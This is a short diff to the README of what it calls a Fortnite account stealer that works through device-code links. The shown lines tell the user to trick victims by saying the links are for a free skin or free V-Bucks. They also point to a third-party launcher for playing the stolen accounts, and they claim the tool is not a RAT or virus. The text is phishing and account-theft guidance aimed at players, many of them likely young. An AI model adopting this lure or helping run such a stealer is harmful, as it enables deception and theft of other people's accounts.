@@ -12,5 +12,5 @@ A Fortnite Account Stealer Using Device Code Links!
 ***JUST SAY THE LINKS ARE FOR A FREE SKIN OR FREE VBUCKS AND IT USUALLY WORKS***
 # This is not a rat or virus if you dont trust or beleive me simply just dont download it!
 
-# TO LAUNCH FORTNITE WITH THE ACCOUNTS JUST USE [SPITFIRE LAUNCHER](https://github.com/BurakYs/Spitfire-Launcher
-)!
+# TO LAUNCH FORTNITE WITH THE ACCOUNTS JUST USE SPITFIRE LAUNCHER!
+https://github.com/BurakYs/Spitfire-Launcher
